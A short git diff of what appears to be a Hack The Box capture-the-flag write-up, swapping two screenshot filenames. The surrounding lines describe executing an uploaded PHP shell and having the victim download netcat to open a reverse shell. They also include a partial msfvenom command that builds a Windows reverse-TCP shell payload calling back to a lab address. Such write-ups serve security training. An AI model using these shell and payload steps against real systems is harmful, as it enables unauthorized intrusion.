@@ -97,7 +97,7 @@ This payload sends a file upload to the victim with a php-script. This script ex
 
 In order to execute the script, we navigate to `http://10.10.10.198:8080/upload/shel.php`, this executes the uploaded php-script and allows us to get the shell. We do need to have a python-webserver running so the victim can download netcat and we need to have a netcat listener to catch it.
 
-![shell](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/htb/shell.png)
+![shell](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/htb/shell_win.png)
 
 And there it is, a reverse shell!
 This also gives us access to the `user.txt` file, located in `C:\Users\shaun\Desktop\user.txt`
@@ -128,6 +128,6 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=8091 EXITFUNC=threa
 
 Still generates a byte-code payload for a reverse shell back to me. And after executing this we catch a shell on our listener!
 
-![root](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/htb/root.png)
+![root](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/htb/root_win.png)
 
 Done!
